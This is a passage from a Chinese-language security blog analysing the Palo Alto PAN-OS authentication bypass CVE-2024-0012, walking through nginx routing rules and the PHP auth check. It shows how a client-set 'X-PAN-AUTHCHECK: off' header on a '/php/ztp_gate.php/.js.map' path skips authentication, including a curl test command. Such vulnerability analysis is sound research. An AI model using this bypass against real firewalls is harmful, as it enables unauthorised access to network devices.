tid;<br>  proxy_pass http://$gohost<span class="hljs-variable">$gohostExt</span>;<br>&#125;<br><br><span class="hljs-comment"># index.php 同样是关闭认证</span><br>location /api/index.php &#123;<br>  proxy_http_version 1.1;<br>  proxy_set_header Connection <span class="hljs-string">&quot;Close&quot;</span>;<br>  <span class="hljs-built_in">set</span> <span class="hljs-variable">$panAuthCheck</span> <span class="hljs-string">&#x27;off&#x27;</span>;<br>  <span class="hljs-comment"># $args 是原始请求</span><br>  <span class="hljs-comment"># 这里会匹配有 password=的把其中的密码进行替换做加密处理, 这样就不会在日志中泄露了</span><br>  <span class="hljs-built_in">set</span> <span class="hljs-variable">$obfuscated_args</span> <span class="hljs-variable">$args</span>;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-variable">$obfuscated_args</span> ~ (?i)(.*)(?=password=)password=[^&amp;]*(.*)) &#123;<br>    <span class="hljs-built_in">set</span> <span class="hljs-variable">$obfuscated_args</span> <span class="hljs-variable">$1password</span>=****<span class="hljs-variable">$2</span>;<br>  &#125;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-variable">$obfuscated_args</span> ~ (?i)(.*)(?=key=)key=[^&amp;]*(.*)) &#123;<br>    <span class="hljs-built_in">set</span> <span class="hljs-variable">$obfuscated_args</span> <span class="hljs-variable">$1key</span>=****<span class="hljs-variable">$2</span>;<br>  &#125;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-variable">$obfuscated_args</span> ~ (?i)(.*)(?=REST_API_TOKEN=)REST_API_TOKEN=[^&amp;]*(.*)) &#123;<br>    <span class="hljs-built_in">set</span> <span class="hljs-variable">$obfuscated_args</span> <span class="hljs-variable">$1REST_API_TOKEN</span>=****<span class="hljs-variable">$2</span>;<br>  &#125;<br>  <span class="hljs-comment"># 原始请求的处理</span><br>  <span class="hljs-built_in">set</span> <span class="hljs-variable">$obfuscated_request</span> <span class="hljs-variable">$request</span>;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-variable">$obfuscated_request</span> ~ (?i)(.*)(?=password=)password=[^&amp;]*(.*)) &#123;<br>    <span class="hljs-built_in">set</span> <span class="hljs-variable">$obfuscated_request</span> <span class="hljs-variable">$1password</span>=****<span class="hljs-variable">$2</span>;<br>  &#125;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-variable">$obfuscated_request</span> ~ (?i)(.*)(?=key=)key=[^&amp;]*(.*)) &#123;<br>    <span class="hljs-built_in">set</span> <span class="hljs-variable">$obfuscated_request</span> <span class="hljs-variable">$1key</span>=****<span class="hljs-variable">$2</span>;<br>  &#125;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-variable">$obfuscated_request</span> ~ (?i)(.*)(?=REST_API_TOKEN=)REST_API_TOKEN=[^&amp;]*(.*)) &#123;<br>    <span class="hljs-built_in">set</span> <span class="hljs-variable">$obfuscated_request</span> <span class="hljs-variable">$1REST_API_TOKEN</span>=****<span class="hljs-variable">$2</span>;<br>  &#125;<br><br>  <span class="hljs-comment"># rewrite below will add `index.php` to $uri.</span><br>  <span class="hljs-comment"># capture the original uri before that happens,</span><br>  <span class="hljs-comment"># for api_metric logging.</span><br>  <span class="hljs-built_in">set</span> <span class="hljs-variable">$orig_uri</span> <span class="hljs-variable">$uri</span>;<br><br>  access_log /var/log/nginx/access.log stripped;<br>  access_log /var/log/nginx/api_metrics.log stripped_metric;<br><br>  <span class="hljs-comment"># look for upload</span><br>  <span class="hljs-keyword">if</span> (<span class="hljs-variable">$content_type</span> ~* <span class="hljs-string">&quot;multipart/form-data&quot;</span>) &#123;<br>    error_page 402 =200 @upload_api;<br>    <span class="hljs-built_in">return</span> 402;<br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (<span class="hljs-variable">$devonly</span> = 1) &#123;<br>    <span class="hljs-built_in">set</span> <span class="hljs-variable">$gohostExt</span> <span class="hljs-variable">$server_port</span>;<br>  &#125;<br><br>  include conf/proxy_default.conf;<br>  proxy_pass http://$gohost<span class="hljs-variable">$gohostExt</span>;<br>  <span class="hljs-comment"># Remove Last-modified from proxy header</span><br>  proxy_hide_header Last-Modified;<br>&#125;<br><br><br>location /api &#123;<br>  <span class="hljs-comment"># do not know why &quot;last&quot; is needed and &quot;break&quot; does not work for api browser</span><br>  rewrite ^(/api)(\/?)$ <span class="hljs-variable">$1</span>/index.php last;<br>  rewrite ^(/api)(\/.*)$ <span class="hljs-variable">$1</span>/index.php<span class="hljs-variable">$2</span> last;<br>&#125;<br><br>location /restapi/ &#123;<br>  proxy_http_version 1.1;<br>  proxy_set_header Connection <span class="hljs-string">&quot;Close&quot;</span>;<br>  <span class="hljs-built_in">set</span> <span class="hljs-variable">$panAuthCheck</span> <span class="hljs-string">&#x27;off&#x27;</span>;<br><br>  <span class="hljs-built_in">set</span> <span class="hljs-variable">$obfuscated_args</span> <span class="hljs-variable">$args</span>;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-variable">$obfuscated_args</span> ~ (?i)(.*)(?=password=)password=[^&amp;]*(.*)) &#123;<br>    <span class="hljs-built_in">set</span> <span class="hljs-variable">$obfuscated_args</span> <span class="hljs-variable">$1password</span>=****<span class="hljs-variable">$2</span>;<br>  &#125;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-variable">$obfuscated_args</span> ~ (?i)(.*)(?=key=)key=[^&amp;]*(.*)) &#123;<br>    <span class="hljs-built_in">set</span> <span class="hljs-variable">$obfuscated_args</span> <span class="hljs-variable">$1key</span>=****<span class="hljs-variable">$2</span>;<br>  &#125;<br><br>  <span class="hljs-built_in">set</span> <span class="hljs-variable">$obfuscated_request</span> <span class="hljs-variable">$request</span>;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-variable">$obfuscated_request</span> ~ (?i)(.*)(?=password=)password=[^&amp;]*(.*)) &#123;<br>    <span class="hljs-built_in">set</span> <span class="hljs-variable">$obfuscated_request</span> <span class="hljs-variable">$1password</span>=****<span class="hljs-variable">$2</span>;<br>  &#125;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-variable">$obfuscated_request</span> ~ (?i)(.*)(?=key=)key=[^&amp;]*(.*)) &#123;<br>    <span class="hljs-built_in">set</span> <span class="hljs-variable">$obfuscated_request</span> <span class="hljs-variable">$1key</span>=****<span class="hljs-variable">$2</span>;<br>  &#125;<br><br>  <span class="hljs-comment"># rewrite below will add `index.php` to $uri.</span><br>  <span class="hljs-comment"># capture the original uri before that happens,</span><br>  <span class="hljs-comment"># for api_metric logging.</span><br>  <span class="hljs-built_in">set</span> <span class="hljs-variable">$orig_uri</span> <span class="hljs-variable">$uri</span>;<br><br>  rewrite ^/restapi(\/.*)$ /php/restapi/index.php<span class="hljs-variable">$1</span> <span class="hljs-built_in">break</span>;<br><br>  access_log /var/log/nginx/access.log obfus_access;<br>  access_log /var/log/nginx/restapi_metrics.log api_metric;<br><br>  <span class="hljs-comment"># `wget` POST does not work.</span><br>  <span class="hljs-comment"># If not regression, this will be removed</span><br>  <span class="hljs-comment"># if ($arg_client = &#x27;wget&#x27;) &#123;</span><br>  <span class="hljs-comment">#   error_page 402 =200 @api_wget_file; return 402;</span><br>  <span class="hljs-comment">#   set $isWgetLoad &quot;w&quot;;</span><br>  <span class="hljs-comment"># &#125;</span><br>  <span class="hljs-comment"># if ($arg_file-name) &#123;</span><br>  <span class="hljs-comment">#   set $isWgetLoad &quot;$&#123;isWgetLoad&#125;f&quot;;</span><br>  <span class="hljs-comment"># &#125;</span><br><br>  <span class="hljs-comment"># look for upload</span><br>  <span class="hljs-keyword">if</span> (<span class="hljs-variable">$content_type</span> ~* <span class="hljs-string">&quot;multipart/form-data&quot;</span>) &#123;<br>    error_page 402 =200 @upload_api;<br>    <span class="hljs-built_in">return</span> 402;<br>  &#125;<br><br>  include conf/proxy_default.conf;<br>  proxy_pass http://$gohost<span class="hljs-variable">$gohostExt</span>;<br>  <span class="hljs-comment"># Remove Last-modified from proxy header</span><br>  proxy_hide_header Last-Modified;<br>&#125;<br><br><span class="hljs-comment"># route `/restapi-doc` to `/restapi-doc/` as `DirectorySlash off` in httpd</span><br>location = /restapi-doc &#123;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-variable">$args</span>) &#123;<br>    <span class="hljs-built_in">return</span> 302 /restapi-doc/?<span class="hljs-variable">$args</span>;<br>  &#125;<br>  <span class="hljs-built_in">return</span> 302 /restapi-doc/;<br>&#125;<br><br><span class="hljs-comment"># It is added to prevent restapi-doc page using default config</span><br>location /restapi-doc/ &#123;<br>  include conf/proxy_default.conf;<br>  proxy_pass http://$gohost<span class="hljs-variable">$gohostExt</span>;<br>&#125;<br><br><span class="hljs-comment"># location @api_wget_file &#123;</span><br><span class="hljs-comment">#     client_body_in_file_only on;</span><br><span class="hljs-comment">#     proxy_set_header X-API-WGET-FILTER-FILE-PATH $request_body_file;</span><br><span class="hljs-comment"># &#125;</span><br><br>location @upload_api &#123;<br>  upload_pass @back_upload_api;<br>  include conf/upload_default.conf;<br>&#125;<br><br>location @back_upload_api &#123;<br>  include conf/proxy_default.conf;<br>  proxy_pass http://$gohost<span class="hljs-variable">$gohostExt</span>;<br>  <span class="hljs-comment"># Remove Last-modified from proxy header</span><br>  proxy_hide_header Last-Modified;<br>&#125;<br><br>location @upload_regular &#123;<br>  upload_pass @back_upload_regular;<br>  include conf/upload_default.conf;<br>&#125;<br><br>location @back_upload_regular &#123;<br>  proxy_intercept_errors on;<br>  include conf/proxy_default.conf;<br>  proxy_pass http://$gohost<span class="hljs-variable">$gohostExt</span>;<br>  <span class="hljs-comment"># Remove Last-modified from proxy header</span><br>  proxy_hide_header Last-Modified;<br>&#125;<br><br><span class="hljs-comment"># Custom error response pages</span><br>error_page 400 /error_page/400.html;<br>error_page 495 /error_page/400.html;<br>error_page 496 /error_page/400.html;<br>error_page 497 /error_page/400.html;<br>error_page 403 /error_page/403.html;<br>error_page 404 /error_page/404.html;<br>error_page 500 /error_page/500.html;<br>error_page 501 /error_page/501.html;<br>error_page 502 /error_page/502.html;<br>error_page 503 /error_page/503.html;<br>error_page 504 /error_page/504.html;<br><br>location /error_page/ &#123;<br>  root /var/appweb/htdocs;<br>  <span class="hljs-comment"># It is directly retrieving static files, we can not do proxy_hide_header, instead should just use add_header</span><br>  add_header Last-Modified <span class="hljs-string">&quot;&quot;</span>;<br>  add_header Cache-Control <span class="hljs-string">&quot;max-age=86400&quot;</span>;<br>  add_header Strict-Transport-Security <span class="hljs-string">&quot;max-age=31536000; includeSubDomains&quot;</span> always;<br>  internal;<span class="hljs-comment"># 只有通过内部重定向（如 rewrite 或 error_page）才能访问这个路径，而不能直接从外部（客户端）访问。</span><br>&#125;<br><br><span class="hljs-comment"># not allow internal page access</span><br>location /phpincludes &#123;<br>  <span class="hljs-built_in">return</span> 404;<br>&#125;<br>location /php/include &#123;<br>  <span class="hljs-built_in">return</span> 404;<br>&#125;<br>location /lib/worldmap &#123;<br>  <span class="hljs-built_in">return</span> 404;<br>&#125;<br><br><span class="hljs-comment"># default catch all</span><br><span class="hljs-built_in">set</span> <span class="hljs-variable">$addXframe</span> 0;<br><br><span class="hljs-comment"># route `/debug` to `/debug/` as `DirectorySlash off` in httpd</span><br>location = /debug &#123;<br>  <span class="hljs-built_in">return</span> 302 /debug/;<br>&#125;<br><br>location / &#123;<br>  <span class="hljs-comment"># intercept errors is turned on only for GUI pages,</span><br>  <span class="hljs-comment"># so that they are directed to the proper error pages.</span><br>  proxy_intercept_errors on;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-variable">$devonly</span> = 1) &#123;<br>    <span class="hljs-built_in">set</span> <span class="hljs-variable">$gohostExt</span> <span class="hljs-variable">$server_port</span>;<br>  &#125;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-variable">$uri</span> = /) &#123;<br>    add_header X-Frame-Options <span class="hljs-string">&quot;DENY&quot;</span>;<br>    add_header X-XSS-Protection <span class="hljs-string">&#x27;1; mode=block;&#x27;</span>;<br>    add_header X-Content-Type-Options <span class="hljs-string">&#x27;nosniff&#x27;</span>;<br>    add_header Strict-Transport-Security <span class="hljs-string">&#x27;max-age=31536000&#x27;</span>;<br>  &#125;<br>  include conf/proxy_default.conf;<br>  proxy_pass_header Authorization;<br>  proxy_pass http://$gohost<span class="hljs-variable">$gohostExt</span>;<br>  <span class="hljs-comment"># Remove Last-modified from proxy header</span><br>  proxy_hide_header Last-Modified;<br>  proxy_cookie_path / <span class="hljs-string">&quot;/; HttpOnly; SameSite=Strict&quot;</span>;<br>&#125;<br><br><span class="hljs-comment"># sample: /wf_report/public|private/...whatever goes to Wildfire</span><br><span class="hljs-comment"># /wf_report/private/wildfire.paloaltonetworks.com/443/xxx/api/1.0/box/VERSION HTTP/1.0</span><br><span class="hljs-comment">#</span><br>location ~ ^/wf_report/([^\/]*)/([^\/]*)/([^\/]*)/(xxx/)?(.*)$ &#123;<br>  proxy_intercept_errors on;<br>  default_type text/plain;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-variable">$request_method</span> = OPTIONS) &#123;<br>    add_header Content-Length 0;<br>    add_header Access-Control-Allow-Origin <span class="hljs-string">&quot;null&quot;</span>;<br>    add_header Access-Control-Allow-Methods <span class="hljs-string">&quot;POST,GET,OPTIONS&quot;</span>;<br>    add_header Access-Control-Allow-Headers <span class="hljs-string">&quot;x-requested-with&quot;</span>;<br>    add_header Access-Control-Allow-Credentials <span class="hljs-string">&quot;true&quot;</span>;<br>    add_header Access-Control-Max-Age 30;<br>    add_header Strict-Transport-Security <span class="hljs-string">&#x27;max-age=31536000&#x27;</span>;<br>    <span class="hljs-built_in">return</span> 200;<br>  &#125;<br>  <span class="hljs-built_in">set</span> <span class="hljs-variable">$wftype</span> <span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span>;<br>  <span class="hljs-built_in">set</span> <span class="hljs-variable">$myproxy</span> <span class="hljs-string">&quot;<span class="hljs-variable">$2</span>&quot;</span>;<br>  <span class="hljs-built_in">set</span> <span class="hljs-variable">$myport</span> <span class="hljs-string">&quot;<span class="hljs-variable">$3</span>&quot;</span>;<br>  <span class="hljs-built_in">set</span> <span class="hljs-variable">$myuri</span> <span class="hljs-string">&quot;<span class="hljs-variable">$5</span>&quot;</span>;<br><br>  rewrite <span class="hljs-string">&quot;^/wf_report/(.*)$&quot;</span> /php/monitor/wfAuthorize.php/<span class="hljs-variable">$myuri</span> <span class="hljs-built_in">break</span>;<br><br>  <span class="hljs-comment"># -------------------------</span><br>  proxy_set_header X-Wf-Server <span class="hljs-variable">$myproxy</span>;<br>  proxy_set_header X-Wf-Server-Port <span class="hljs-variable">$myport</span>;<br>  proxy_set_header X-Wf-Server-Type <span class="hljs-variable">$wftype</span>;<br>  <span class="hljs-comment"># -------------------------</span><br>  include conf/proxy_default.conf;<br>  proxy_pass http://$gohost<span class="hljs-variable">$gohostExt</span>;<br><br>  add_header Access-Control-Allow-Origin <span class="hljs-string">&quot;null&quot;</span>;<br>  add_header Access-Control-Allow-Methods <span class="hljs-string">&quot;POST,GET&quot;</span>;<br>  add_header Access-Control-Allow-Headers <span class="hljs-string">&quot;x-requested-with&quot;</span>;<br>  add_header Access-Control-Allow-Credentials <span class="hljs-string">&quot;true&quot;</span>;<br>  add_header Access-Control-Max-Age 30;<br>  add_header Strict-Transport-Security <span class="hljs-string">&#x27;max-age=31536000&#x27;</span>;<br>  <span class="hljs-comment"># Remove Last-modified from proxy header</span><br>  proxy_hide_header Last-Modified;<br>&#125;<br><br>location ~ ^/php/monitor/(wfAuthorize|wfProxy).php &#123;<br>  internal;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>nginx 默认过滤请求头，所以是需要显式的设置，其他的也就会默认的传输：</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20250518001035357.png?imageSlim" alt="image-20250518001035357"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20250518001021340.png?imageSlim" alt="image-20250518001021340"></p><p>conf&#x2F;proxy_default.conf</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-comment"># default proxy request header setting</span><br><span class="hljs-comment"># 设置了一些请求头, 不过必须包含才会起作用, 所以可以看到匹配的规则中设置 $panAuthCheck 了都要包含一下</span><br><span class="hljs-attribute">proxy_set_header</span> Host <span class="hljs-variable">$host</span>;<br><span class="hljs-attribute">proxy_set_header</span> X-Real-IP <span class="hljs-variable">$remote_addr</span>;<br><span class="hljs-attribute">proxy_set_header</span> X-Real-Scheme <span class="hljs-variable">$scheme</span>;<br><span class="hljs-attribute">proxy_set_header</span> X-Real-Port <span class="hljs-variable">$server_port</span>;<br><span class="hljs-attribute">proxy_set_header</span> X-Real-Server-IP <span class="hljs-variable">$server_addr</span>;<br><span class="hljs-attribute">proxy_set_header</span> X-Forwarded-For  <span class="hljs-variable">$proxy_add_x_forwarded_for</span>;<br><span class="hljs-attribute">proxy_set_header</span> X-pan-ndpp-mode <span class="hljs-variable">$pan_ndpp_mode</span>;<br><span class="hljs-attribute">proxy_set_header</span> Proxy <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-attribute">proxy_set_header</span> X-pan-AuthCheck <span class="hljs-variable">$panAuthCheck</span>;<br></code></pre></td></tr></table></figure><p>nginx 解析规则：</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/840264-20221209221453931-440698749.png?imageSlim" alt="img"></p><p>学习到了 nginx 的很多知识</p><p>而且从上图中也知道了，nginx 中配置的规则就是匹配到了就走这条后面的就不处理了。</p><p>整理一下匹配的规则（ 按顺序 ）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">/nginx_status：127.0.0.1<br>~ \.js\.map$ ：整体上是为了处理缓存，不过在 <span class="hljs-built_in">set</span> <span class="hljs-variable">$panAuthCheck</span> <span class="hljs-string">&#x27;on&#x27;</span>; 之前就导致了X-pan-AuthCheck可以被自定义<br><span class="hljs-built_in">set</span> <span class="hljs-variable">$panAuthCheck</span> <span class="hljs-string">&#x27;on&#x27;</span>; 配置默认启用认证检测<br>^\/unauth\/.+$ 无需认证<br>/php/logout.php 无需认证<br>^/login/(images|js)/  login 的静态资源访问，重写规则<br>^/login/(css|fonts)/ 静态资源 /var/appweb/htdocs/styles/<br>/php/login.php <span class="hljs-variable">$panAuthCheck</span> <span class="hljs-string">&#x27;off&#x27;</span> =&gt; conf/proxy_default.conf =&gt; 转到上游服务<br>/SAML20/SP/ACS off /unauth/php/DualLogin.php X-ORIG-URI /SAML20/SP/ACS<br>/SAML20/SP/SLO<br>/SAML20/SP/TEST<br>^/(vendor|python)([^\/]*)/(.*).(json|lock|conf)$ =&gt; 404 不允许访问<br>/upload/ =&gt; @upload_regular<br>/upload =&gt; 403<br>/plugins/([^\/]*)/ui/(js|styles|generated|VMSeries_Help|<span class="hljs-built_in">help</span>)/(.*)$ =&gt; /installed/<span class="hljs-variable">$1</span>/ui/<span class="hljs-variable">$2</span>/<span class="hljs-variable">$3</span> =&gt; /opt/plugins<br>/webui/ =&gt; ^/webui(\/.*)$ /php-packages/firewall_webui/php/api/index.php<span class="hljs-variable">$1</span><br>/api/index.php =&gt; <span class="hljs-variable">$args</span>,<span class="hljs-variable">$request</span> 中敏感信息替换为 *， multipart/form-data =&gt; @upload_api<br>/api =&gt; /api/xfdfs =&gt; /apifsdfs 的情况重写 <span class="hljs-variable">$1</span>/index.php<span class="hljs-variable">$2</span><br>/restapi/ =&gt; /api/index.php 类似<br>/restapi-doc =&gt; /restapi-doc/<br>/restapi-doc/ =&gt; include conf/proxy_default.conf 认证生效<br>@upload_api =》 @back_upload_api incinternallude conf/proxy_default.conf 认证生效<br>/error_page/ =》 xxx<br></code></pre></td></tr></table></figure><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>php.ini 和 index.php 都表明了先加载 envSetup.php：</p><p>只有 4 个条件都满足后才会进行认证验证：</p><ul><li>$_SERVER[‘HTTP_X_PAN_AUTHCHECK’] !&#x3D; ‘off’</li><li>$_SERVER[‘PHP_SELF’] !&#x3D;&#x3D; ‘&#x2F;CA&#x2F;ocsp’</li><li>$_SERVER[‘PHP_SELF’] !&#x3D;&#x3D; ‘&#x2F;php&#x2F;login.php’</li><li>stristr($_SERVER[‘REMOTE_HOST’], ‘127.0.0.1’) &#x3D;&#x3D;&#x3D; false</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<br>    <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_PAN_AUTHCHECK&#x27;</span>] != <span class="hljs-string">&#x27;off&#x27;</span><br>    &amp;&amp; <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>] !== <span class="hljs-string">&#x27;/CA/ocsp&#x27;</span><br>    &amp;&amp;  <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>] !== <span class="hljs-string">&#x27;/php/login.php&#x27;</span><br>    &amp;&amp; <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_HOST&#x27;</span>], <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>) === <span class="hljs-literal">false</span><br>) &#123;<br>    <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PAN_SESSION_READONLY&#x27;</span>] = <span class="hljs-literal">true</span>;<br>    <span class="hljs-variable">$ws</span> = <span class="hljs-title class_">WebSession</span>::<span class="hljs-title function_ invoke__">getInstance</span>(<span class="hljs-variable">$ioc</span>);<br>    <span class="hljs-variable">$ws</span>-&gt;<span class="hljs-title function_ invoke__">start</span>();<br>    <span class="hljs-variable">$ws</span>-&gt;<span class="hljs-title function_ invoke__">close</span>();<br>    <span class="hljs-comment">// these are horrible hacks.</span><br>    <span class="hljs-comment">// This whole code should be removed and only make available to a few pages: main, debug, etc.</span><br>    <span class="hljs-keyword">if</span> (<br>        !<span class="hljs-title class_">Str</span>::<span class="hljs-title function_ invoke__">startsWith</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>], <span class="hljs-string">&#x27;/php-packages/panorama_webui/php/api/index.php&#x27;</span>)<br>        &amp;&amp; !<span class="hljs-title class_">Str</span>::<span class="hljs-title function_ invoke__">startsWith</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>], <span class="hljs-string">&#x27;/php-packages/firewall_webui/php/api/index.php&#x27;</span>)<br>    ) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Backend</span>::<span class="hljs-title function_ invoke__">quickSessionExpiredCheck</span>()) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>])) &#123;<br>                <span class="hljs-title class_">Util</span>::<span class="hljs-title function_ invoke__">login</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>]);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-title class_">Util</span>::<span class="hljs-title function_ invoke__">login</span>();<br>            &#125;<br>            <span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20250516131149267.png?imageSlim" alt="image-20250516131149267"></p><p>HTTP_X_PAN_AUTHCHECK &#x3D;&gt; Req Header X-PAN-AUTHCHECK</p><p>这里请求的是 Apache 的 WEB 服务：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">curl http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">28250</span><span class="hljs-regexp">/php/</span>ztp_gate.php -v<br>curl http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">28250</span><span class="hljs-regexp">/php/</span>ztp_gate.php -v -H <span class="hljs-string">&quot;X-PAN-AUTHCHECK: off&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20250516133116566.png?imageSlim" alt="image-20250516133116566"></p><p>可以看到 X-PAN-AUTHCHECK 是可以有效绕过的。</p><p>但是放在 80,443 这些 nginx 的服务端口就不行了。</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20250516133249006.png?imageSlim" alt="image-20250516133249006"></p><p>这个原因其实在从上面的 nginx 配置分析就可以看出来。除过几个特定的路径设置了 $panAuthCheck ‘off’ 也就是 proxy_default.conf 中的 X-pan-AuthCheck $panAuthCheck 其他的路由在刚开始就被默认配置为 on 了：</p><ul><li>^/unauth/.+$</li><li>&#x2F;php&#x2F;logout.php</li><li>&#x2F;php&#x2F;login.php</li><li>&#x2F;SAML20&#x2F;SP&#x2F;ACS</li><li>xxxx</li></ul><p>不过很明显的是存在漏网之鱼的：</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20250518005025252.png?imageSlim" alt="image-20250518005025252"></p><p>而自定义的 X-PAN-AUTHCHECK 并不在 nginx 默认的过滤范围之内（ Authorization、下划线…）那么也就是说，客户端自定义的请求头是可以被传递到 apache 的，也就是造成了身份认证绕过。（ 下面那个 &#x2F;unauth 路由的也是，还有个认证绕过的漏洞，这里不讲 ）</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20250518005410367.png?imageSlim" alt="image-20250518005410367"></p><p>然后还有一个问题，为什么访问 &#x2F;php&#x2F;ztp_gate.php&#x2F;.js.map 会解析 &#x2F;php&#x2F;ztp_gate.php 呢？</p><p>没有找到什么关于的配置，本地测试 apache，nginx 都是可以这样解析的 .php&#x2F;随机字符串</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20250518011157928.png?imageSlim" alt="image-20250518011157928"></p><p>学到了：</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20250518011349251.png?imageSlim" alt="image-20250518011349251"></p><p>可以看到解析是始终是 php 文件</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20250518011529083.png?imageSlim" alt="image-20250518011529083"></p><p>这也解释了为什么会有这种构造了：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">^<span class="hljs-regexp">/webui(\/.*)$ /</span>php-packages<span class="hljs-regexp">/firewall_webui/</span>php<span class="hljs-regexp">/api/i</span>ndex.php<span class="hljs-variable">$1</span><br></code></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://labs.watchtowr.com/pots-and-pans-aka-an-sslvpn-palo-alto-pan-os-cve-2024-0012-and-cve-2024-9474/">https://labs.watchtowr.com/pots-and-pans-aka-an-sslvpn-palo-alto-pan-os-cve-2024-0012-and-cve-2024-9474/</a></li><li><a href="https://www.cnblogs.com/xiongzaiqiren/p/16968651.html">https://www.cnblogs.com/xiongzaiqiren/p/16968651.html</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2024-9474 Palo Alto 权限提升漏洞分析 [未完成]</title>
      <link href="/2025/05/06/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/CVE-2024-9474/"/>
      <url>/2025/05/06/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/CVE-2024-9474/</url>
      
